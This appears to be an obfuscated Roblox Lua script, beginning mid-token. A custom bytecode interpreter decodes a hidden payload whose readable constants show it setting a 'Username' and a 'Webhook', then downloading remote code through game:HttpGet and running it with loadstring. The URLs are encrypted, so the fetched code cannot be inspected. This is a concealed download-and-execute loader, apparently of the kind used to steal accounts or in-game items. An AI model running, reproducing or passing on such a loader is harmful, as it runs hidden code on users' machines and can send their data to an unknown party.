cal v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v24,v25) local v26={};for v41=1, #v24 do v6(v26,v0(v4(v1(v2(v24,v41,v41 + 1 )),v1(v2(v25,1 + (v41% #v25) ,1 + (v41% #v25) + 1 )))%256 ));end return v5(v26);end local v8=tonumber;local v9=string.byte;local v10=string.char;local v11=string.sub;local v12=string.gsub;local v13=string.rep;local v14=table.concat;local v15=table.insert;local v16=math.ldexp;local v17=getfenv or function() return _ENV;end ;local v18=setmetatable;local v19=pcall;local v20=select;local v21=unpack or table.unpack ;local v22=tonumber;local function v23(v27,v28,...) local v29=1;local v30;v27=v12(v11(v27,15 -10 ),v7("\11\50","\48\37\28\67\90\191\127\148"),function(v42) if (v9(v42,5 -3 )==81) then local v93=0;while true do if (v93==0) then v30=v8(v11(v42,1,1));return "";end end else local v94=v10(v8(v42,16));if v30 then local v102=0;local v103;while true do if (v102==1) then return v103;end if (v102==0) then v103=v13(v94,v30);v30=nil;v102=1;end end else return v94;end end end);local function v31(v43,v44,v45) if v45 then local v95=(v43/((3 -1)^(v44-1)))%(2^(((v45-1) -(v44-1)) + 1)) ;return v95-(v95%1) ;else local v96=0;local v97;while true do if (v96==0) then v97=2^(v44-1) ;return (((v43%(v97 + v97))>=v97) and 1) or 0 ;end end end end local function v32() local v46=0;local v47;while true do if (v46==1) then return v47;end if (v46==0) then v47=v9(v27,v29,v29);v29=v29 + 1 ;v46=1;end end end local function v33() local v48=0;local v49;local v50;while true do if (v48==1) then return (v50 * 256) + v49 ;end if (0==v48) then v49,v50=v9(v27,v29,v29 + 2 );v29=v29 + 2 ;v48=1;end end end local function v34() local v51,v52,v53,v54=v9(v27,v29,v29 + 3 );v29=v29 + 4 ;return (v54 * 16777216) + (v53 * 65536) + (v52 * 256) + v51 ;end local function v35() local v55=0;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v55==3) then if (v60==0) then if (v59==0) then return v61 * 0 ;else local v120=0;while true do if (v120==0) then v60=1;v58=0;break;end end end elseif (v60==2047) then return ((v59==0) and (v61 * (1/0))) or (v61 * NaN) ;end return v16(v61,v60-(1591 -(367 + 201)) ) * (v58 + (v59/(2^52))) ;end if (v55==0) then v56=v34();v57=v34();v55=1;end if (v55==1) then v58=2 -1 ;v59=(v31(v57,1,20) * (2^(651 -(555 + 64)))) + v56 ;v55=2;end if (v55==2) then v60=v31(v57,21,31);v61=((v31(v57,32)==1) and  -(932 -(857 + 74))) or 1 ;v55=3;end end end local function v36(v62) local v63=0;local v64;local v65;while true do if (v63==0) then v64=nil;if  not v62 then local v119=0;while true do if (v119==0) then v62=v34();if (v62==(927 -(214 + 713))) then return "";end break;end end end v63=1;end if (v63==2) then v65={};for v104=1, #v64 do v65[v104]=v10(v9(v11(v64,v104,v104)));end v63=3;end if (v63==3) then return v14(v65);end if (v63==1) then v64=v11(v27,v29,(v29 + v62) -1 );v29=v29 + v62 ;v63=2;end end end local v37=v34;local function v38(...) return {...},v20("#",...);end local function v39() local v66=0;local v67;local v68;local v69;local v70;local v71;local v72;while true do if (v66==0) then v67={};v68={};v69={};v70={v67,v68,nil,v69};v66=1;end if (1==v66) then v71=v34();v72={};for v106=1 + 0 ,v71 do local v107=v32();local v108;if (v107==1) then v108=v32()~=0 ;elseif (v107==2) then v108=v35();elseif (v107==3) then v108=v36();end v72[v106]=v108;end v70[3]=v32();v66=2;end if (v66==2) then for v110=1,v34() do local v111=0;local v112;while true do if (v111==0) then v112=v32();if (v31(v112,1,1)==0) then local v121=v31(v112,2,3);local v122=v31(v112,4,1 + 5 );local v123={v33(),v33(),nil,nil};if (v121==0) then local v125=0;while true do if (v125==0) then v123[3]=v33();v123[4]=v33();break;end end elseif (v121==1) then v123[3]=v34();elseif (v121==2) then v123[3]=v34() -(2^(1653 -(1523 + 114))) ;elseif (v121==3) then v123[3 + 0 ]=v34() -(2^16) ;v123[4]=v33();end if (v31(v122,1 -0 ,1066 -(68 + 997) )==1) then v123[2]=v72[v123[2]];end if (v31(v122,2,2)==(1271 -(226 + 1044))) then v123[3]=v72[v123[3]];end if (v31(v122,3,3)==1) then v123[4]=v72[v123[4]];end v67[v110]=v123;end break;end end end for v113=1,v34() do v68[v113-1 ]=v39();end return v70;end end end local function v40(v73,v74,v75) local v76=v73[1];local v77=v73[2];local v78=v73[3];return function(...) local v79=v76;local v80=v77;local v81=v78;local v82=v38;local v83=1;local v84= -(4 -3);local v85={};local v86={...};local v87=v20("#",...) -(118 -(32 + 85)) ;local v88={};local v89={};for v98=0,v87 do if (v98>=v81) then v85[v98-v81 ]=v86[v98 + 1 ];else v89[v98]=v86[v98 + 1 + 0 ];end end local v90=(v87-v81) + 1 ;local v91;local v92;while true do v91=v79[v83];v92=v91[1];if (v92<=32) then if (v92<=15) then if (v92<=7) then if (v92<=3) then if (v92<=1) then if (v92>0) then local v135=v80[v91[1 + 2 ]];local v136;local v137={};v136=v18({},{[v7("\40\71\142\32\211\76\15","\41\119\24\231\78\183")]=function(v252,v253) local v254=0;local v255;while true do if (v254==0) then v255=v137[v253];return v255[1][v255[2]];end end end,[v7("\18\154\68\217\87\139\35\161\79\196","\226\77\197\42\188\32")]=function(v256,v257,v258) local v259=v137[v257];v259[958 -(892 + 65) ][v259[2]]=v258;end});for v261=1,v91[4] do local v262=0;local v263;while true do if (0==v262) then v83=v83 + 1 ;v263=v79[v83];v262=1;end if (v262==1) then if (v263[1]==65) then v137[v261-(2 -1) ]={v89,v263[3]};else v137[v261-(1 -0) ]={v74,v263[3]};end v88[ #v88 + 1 ]=v137;break;end end end v89[v91[2]]=v40(v135,v136,v75);else local v139=0;local v140;local v141;while true do if (v139==1) then for v322=v140 + 1 ,v84 do v15(v141,v89[v322]);end break;end if (0==v139) then v140=v91[3 -1 ];v141=v89[v140];v139=1;end end end elseif (v92==(352 -(87 + 263))) then local v142=0;local v143;local v144;local v145;while true do if (v142==0) then v143=v91[2];v144=v89[v143 + 2 ];v142=1;end if (v142==1) then v145=v89[v143] + v144 ;v89[v143]=v145;v142=2;end if (2==v142) then if (v144>0) then if (v145<=v89[v143 + 1 ]) then v83=v91[3];v89[v143 + 3 ]=v145;end elseif (v145>=v89[v143 + 1 ]) then local v353=0;while true do if (v353==0) then v83=v91[3];v89[v143 + 3 ]=v145;break;end end end break;end end else do return v89[v91[2]]();end end elseif (v92<=5) then if (v92>4) then if  not v89[v91[2]] then v83=v83 + 1 ;else v83=v91[3];end elseif v89[v91[2]] then v83=v83 + 1 ;else v83=v91[3];end elseif (v92>6) then v75[v91[3]]=v89[v91[2]];else local v148=0;local v149;local v150;local v151;local v152;while true do if (v148==0) then v149=v91[2];v150,v151=v82(v89[v149](v21(v89,v149 + (181 -(67 + 113)) ,v91[3])));v148=1;end if (v148==1) then v84=(v151 + v149) -1 ;v152=0;v148=2;end if (v148==2) then for v323=v149,v84 do local v324=0;while true do if (v324==0) then v152=v152 + 1 ;v89[v323]=v150[v152];break;end end end break;end end end elseif (v92<=11) then if (v92<=9) then if (v92>8) then v89[v91[2]]=v89[v91[3]]%v91[3 + 1 ] ;else local v154=0;local v155;local v156;local v157;local v158;while true do if (v154==0) then v155=v91[2];v156,v157=v82(v89[v155](v21(v89,v155 + 1 ,v91[3])));v154=1;end if (1==v154) then v84=(v157 + v155) -1 ;v158=0;v154=2;end if (v154==2) then for v325=v155,v84 do local v326=0;while true do if (v326==0) then v158=v158 + 1 ;v89[v325]=v156[v158];break;end end end break;end end end elseif (v92>10) then local v159=0;local v160;local v161;local v162;while true do if (v159==2) then if (v161>0) then if (v162<=v89[v160 + 1 ]) then v83=v91[3];v89[v160 + 3 ]=v162;end elseif (v162>=v89[v160 + 1 ]) then v83=v91[3];v89[v160 + 3 ]=v162;end break;end if (v159==1) then v162=v89[v160] + v161 ;v89[v160]=v162;v159=2;end if (v159==0) then v160=v91[4 -2 ];v161=v89[v160 + 2 ];v159=1;end end else v89[v91[2]]= #v89[v91[3]];end elseif (v92<=13) then if (v92>12) then local v164=0;local v165;local v166;while true do if (v164==0) then v165=v91[2];v166=v89[v165];v164=1;end if (v164==1) then for v327=v165 + 1 ,v84 do v15(v166,v89[v327]);end break;end end else local v167=v91[2];do return v21(v89,v167,v84);end end elseif (v92==14) then v89[v91[2]]=v91[3];else v89[v91[2 + 0 ]]=v89[v91[11 -8 ]]%v91[4] ;end elseif (v92<=23) then if (v92<=19) then if (v92<=17) then if (v92==16) then local v171=v91[2];local v172=v89[v91[3]];v89[v171 + 1 ]=v172;v89[v171]=v172[v91[4]];else v89[v91[2]]=v91[3] + v89[v91[4]] ;end elseif (v92==18) then local v177=v80[v91[3]];local v178;local v179={};v178=v18({},{[v7("\5\41\253\187\62\19\236","\213\90\118\148")]=function(v264,v265) local v266=0;local v267;while true do if (0==v266) then v267=v179[v265];return v267[1][v267[2]];end end end,[v7("\100\17\186\83\90\82\32\176\83\85","\45\59\78\212\54")]=function(v268,v269,v270) local v271=0;local v272;while true do if (v271==0) then v272=v179[v269];v272[953 -(802 + 150) ][v272[2]]=v270;break;end end end});for v273=1,v91[4] do local v274=0;local v275;while true do if (0==v274) then v83=v83 + 1 ;v275=v79[v83];v274=1;end if (v274==1) then if (v275[1]==65) then v179[v273-1 ]={v89,v275[3]};else v179[v273-1 ]={v74,v275[3]};end v88[ #v88 + 1 ]=v179;break;end end end v89[v91[2]]=v40(v177,v178,v75);else local v181=0;local v182;while true do if (v181==0) then v182=v91[2];v89[v182]=v89[v182](v21(v89,v182 + 1 ,v91[3]));break;end end end elseif (v92<=21) then if (v92==20) then do return;end else v89[v91[2]]=v89[v91[3]];end elseif (v92>22) then local v185=0;local v186;while true do if (v185==0) then v186=v91[2];v89[v186]=v89[v186](v21(v89,v186 + (1 -0) ,v84));break;end end else local v187=v91[2];local v188,v189=v82(v89[v187](v89[v187 + 1 ]));v84=(v189 + v187) -1 ;local v190=0;for v276=v187,v84 do local v277=0;while true do if (v277==0) then v190=v190 + 1 ;v89[v276]=v188[v190];break;end end end end elseif (v92<=(20 + 7)) then if (v92<=25) then if (v92==(1021 -(915 + 82))) then local v191=0;local v192;local v193;local v194;local v195;while true do if (0==v191) then v192=v91[2];v193,v194=v82(v89[v192](v21(v89,v192 + 1 ,v84)));v191=1;end if (v191==1) then v84=(v194 + v192) -1 ;v195=0;v191=2;end if (v191==2) then for v335=v192,v84 do local v336=0;while true do if (0==v336) then v195=v195 + (2 -1) ;v89[v335]=v193[v195];break;end end end break;end end else v89[v91[2]]=v75[v91[3]];end elseif (v92>26) then v89[v91[2]]=v91[3] + v89[v91[4]] ;elseif v89[v91[2]] then v83=v83 + 1 + 0 ;else v83=v91[3];end elseif (v92<=29) then if (v92==(36 -8)) then v89[v91[2]]=v89[v91[3]][v91[4]];else v89[v91[2]]=v89[v91[3]]%v89[v91[4]] ;end elseif (v92<=30) then local v202=v91[2];v89[v202](v21(v89,v202 + 1 ,v84));elseif (v92>31) then if (v89[v91[2]]==v91[4]) then v83=v83 + (1188 -(1069 + 118)) ;else v83=v91[3];end else local v285=v91[2];local v286=v89[v285];local v287=v89[v285 + (4 -2) ];if (v287>0) then if (v286>v89[v285 + 1 ]) then v83=v91[3];else v89[v285 + 3 ]=v286;end elseif (v286<v89[v285 + 1 ]) then v83=v91[6 -3 ];else v89[v285 + 3 ]=v286;end end elseif (v92<=48) then if (v92<=40) then if (v92<=36) then if (v92<=34) then if (v92>33) then v89[v91[2]]=v75[v91[3]];else local v205=v91[2];v89[v205]=v89[v205](v21(v89,v205 + 1 + 0 ,v84));end elseif (v92==35) then if  not v89[v91[2]] then v83=v83 + 1 ;else v83=v91[3];end else v89[v91[2]]=v89[v91[3]] + v91[4] ;end elseif (v92<=38) then if (v92>37) then local v208=0;local v209;while true do if (v208==0) then v209=v91[2];v89[v209](v21(v89,v209 + 1 ,v84));break;end end else v89[v91[2]]=v89[v91[4 -1 ]] + v91[4] ;end elseif (v92>39) then v75[v91[3]]=v89[v91[2]];else v89[v91[2]]=v91[3];end elseif (v92<=44) then if (v92<=42) then if (v92==41) then local v215=0;local v216;local v217;local v218;while true do if (0==v215) then v216=v91[2];v217=v89[v216];v215=1;end if (v215==1) then v218=v89[v216 + 2 ];if (v218>0) then if (v217>v89[v216 + 1 ]) then v83=v91[3];else v89[v216 + 3 + 0 ]=v217;end elseif (v217<v89[v216 + 1 ]) then v83=v91[794 -(368 + 423) ];else v89[v216 + 3 ]=v217;end break;end end else v89[v91[2]]=v74[v91[3]];end elseif (v92==43) then do return v89[v91[2]]();end else for v278=v91[2],v91[3] do v89[v278]=nil;end end elseif (v92<=46) then if (v92==45) then local v221=0;local v222;while true do if (v221==0) then v222=v91[2];v89[v222]=v89[v222](v21(v89,v222 + 1 ,v91[3]));break;end end else v83=v91[3];end elseif (v92>47) then v89[v91[2]]={};else local v225=v91[2];do return v89[v225](v21(v89,v225 + 1 ,v91[9 -6 ]));end end elseif (v92<=(74 -(10 + 8))) then if (v92<=52) then if (v92<=50) then if (v92>49) then for v280=v91[2],v91[3] do v89[v280]=nil;end else v89[v91[7 -5 ]]();end elseif (v92==51) then v89[v91[2]]=v89[v91[3]][v91[4]];else v89[v91[2]]=v74[v91[3]];end elseif (v92<=54) then if (v92==53) then local v230=v91[444 -(416 + 26) ];do return v21(v89,v230,v84);end else v83=v91[9 -6 ];end elseif (v92==55) then if (v89[v91[2]]==v91[4]) then v83=v83 + 1 ;else v83=v91[3];end else v89[v91[2]]=v89[v91[3]]%v89[v91[4]] ;end elseif (v92<=60) then if (v92<=58) then if (v92>57) then local v233=0;local v234;local v235;local v236;local v237;while true do if (v233==1) then v84=(v236 + v234) -1 ;v237=0;v233=2;end if (v233==2) then for v338=v234,v84 do local v339=0;while true do if (v339==0) then v237=v237 + 1 ;v89[v338]=v235[v237];break;end end end break;end if (v233==0) then v234=v91[2];v235,v236=v82(v89[v234](v89[v234 + 1 ]));v233=1;end end else local v238=0;local v239;local v240;local v241;local v242;while true do if (v238==0) then v239=v91[2];v240,v241=v82(v89[v239](v21(v89,v239 + 1 ,v84)));v238=1;end if (v238==2) then for v340=v239,v84 do v242=v242 + 1 + 0 ;v89[v340]=v240[v242];end break;end if (v238==1) then v84=(v241 + v239) -1 ;v242=0;v238=2;end end end elseif (v92==59) then local v243=v91[2];do return v89[v243](v21(v89,v243 + 1 ,v91[3]));end else local v244=v91[3 -1 ];local v245=v89[v91[3]];v89[v244 + 1 ]=v245;v89[v244]=v245[v91[4]];end elseif (v92<=62) then if (v92==61) then v89[v91[2]]={};else v89[v91[2]]= #v89[v91[3]];end elseif (v92<=63) then do return;end elseif (v92>64) then v89[v91[2]]=v89[v91[3]];else v89[v91[2]]();end v83=v83 + 1 ;end end;end return v40(v39(),{},v28)(...);end return v23("LOL!0D3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E7365727403053Q006D6174636803083Q00746F6E756D62657203053Q007063612Q6C00243Q0012193Q00013Q0020335Q0002001219000100013Q002033000100010003001219000200013Q002033000200020004001219000300053Q0006230003000A000100010004363Q000A0001001219000300063Q002033000400030007001219000500083Q002033000500050009001219000600083Q00203300060006000A00060100073Q000100062Q00413Q00064Q00418Q00413Q00044Q00413Q00014Q00413Q00024Q00413Q00053Q001219000800013Q00203300080008000B0012190009000C3Q001219000A000D3Q000601000B0001000100052Q00413Q00074Q00413Q00094Q00413Q00084Q00413Q000A4Q00413Q000B4Q0015000C000B4Q0003000C00014Q000C000C6Q00143Q00013Q00023Q00023Q00026Q00F03F026Q00704002264Q003D00025Q00120E000300014Q003E00045Q00120E000500013Q0004290003002100012Q003400076Q0015000800024Q0034000900014Q0034000A00024Q0034000B00034Q0034000C00044Q0015000D6Q0015000E00063Q002024000F000600012Q0008000C000F4Q0021000B3Q00022Q0034000C00034Q0034000D00044Q0015000E00014Q003E000F00014Q0038000F0006000F001011000F0001000F2Q003E001000014Q00380010000600100010110010000100100020240010001000012Q0008000D00104Q0018000C6Q0021000A3Q000200200F000A000A00022Q003A0009000A4Q001E00073Q000100040B0003000500012Q0034000300054Q0015000400024Q003B000300044Q000C00036Q00143Q00017Q00043Q00027Q004003053Q003A25642B3A2Q033Q0025642B026Q00F03F001C3Q0006015Q000100012Q002A8Q0034000100014Q0034000200024Q0034000300024Q003D00046Q0034000500034Q001500066Q0032000700074Q0008000500074Q000D00043Q000100203300040004000100120E000500024Q001300030005000200120E000400034Q0008000200044Q002100013Q000200263700010018000100040004363Q001800012Q001500016Q003D00026Q003B000100024Q000C00015Q0004363Q001B00012Q0034000100044Q0003000100014Q000C00016Q00143Q00013Q00013Q000C3Q0003083Q00557365726E616D6503083Q00E2DAD82AD7AED11F03083Q007EB1A3BB4586DBA703073Q00576562682Q6F6B03793Q002BD93ED5EF798265C1F530CE25D7F86DCE25C8B322DD238AEB26CF22CAF328DE6594AF709E7B95AD769D7D90A87A9E7990A97A9E65CDD539EC03C2D407D40690FA349902D7FB33C625FAF226CC2196FD15EB1FCDAF07CF0BC4D672FA33CBAB7B9D33D7A5749426F0E574E521CEC802C02CE9F50E9C23D6E62103053Q009C43AD4AA5030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403503Q003CA35D06AF7C097BA54801F2214F20BF5C14A9354326B44618A8234820F94A19B1697226B64D13F1155231B64513AE69733ABE5F13AE354738F85B13BA35093CB24812AF694B35BE47598E294438B85103073Q002654D72976DC46026Q00F03F01193Q00061A3Q001700013Q0004363Q001700012Q003400015Q00120E000200023Q00120E000300034Q0013000100030002001228000100014Q003400015Q00120E000200053Q00120E000300064Q0013000100030002001228000100043Q001219000100073Q001219000200083Q0020100002000200092Q003400045Q00120E0005000A3Q00120E0006000B4Q0008000400064Q001800026Q002100013Q00022Q00310001000100010004363Q0018000100203300013Q000C2Q00143Q00017Q00",v17(),...);
